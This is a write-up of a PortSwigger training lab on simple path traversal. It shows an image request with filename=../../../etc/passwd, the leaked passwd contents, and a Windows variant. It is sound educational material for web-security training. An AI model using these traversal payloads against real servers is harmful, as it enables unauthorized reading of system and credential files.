# Lab 01 — Simple case

**Difficulty:** 🟢 Apprentice  
**Technique:** Path Traversal  
**Link:** https://portswigger.net/web-security/file-path-traversal/lab-simple-case

---

## Concept

Path traversal (also known as directory traversal) allows an attacker to read arbitrary files on the server by manipulating file path parameters. When an application passes user-supplied input to filesystem operations without proper validation, sequences like `../` can be used to escape the intended directory and access files outside of it.

---

## Reconnaissance

The application loads product images using a URL parameter:

```
GET /image?filename=18.jpg
```

The `filename` parameter is passed directly to the server's filesystem with no filtering or validation.

---

## Process

### Step 1 — Identify the injection point

Intercept any product image request in Burp Repeater:

```
GET /image?filename=18.jpg HTTP/2
```

### Step 2 — Traverse to the filesystem root

Images are typically stored under a path like `/var/www/images/`. Three `../` sequences navigate up to the filesystem root:

```
GET /image?filename=../../../etc/passwd HTTP/2
```

---

## Result

```
HTTP/2 200 OK
Content-Type: image/jpeg

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
...
peter:x:12001:12001::/home/peter:/bin/bash
carlos:x:12002:12002::/home/carlos:/bin/bash
```

The server returned the full contents of `/etc/passwd` with a 200 response.

> **Note:** The `Content-Type` header remained `image/jpeg` even though the response body is plaintext — the application doesn't validate the output type either.

---

## Issues encountered

None. This lab has no filtering — the simplest possible case.

---

## Takeaways

- Without input validation, `../` sequences allow escaping the app's root directory
- Three levels (`../../../`) are typically enough to reach the filesystem root
- Classic target on Linux: `/etc/passwd`
- Windows equivalent: `..\..\..\windows\win.ini`
- Response `Content-Type` may not match the actual content being returned

---

## References

- [Path Traversal — PortSwigger](https://portswigger.net/web-security/file-path-traversal)
- [Path Traversal Cheat Sheet](https://portswigger.net/web-security/file-path-traversal#reading-arbitrary-files-via-path-traversal)
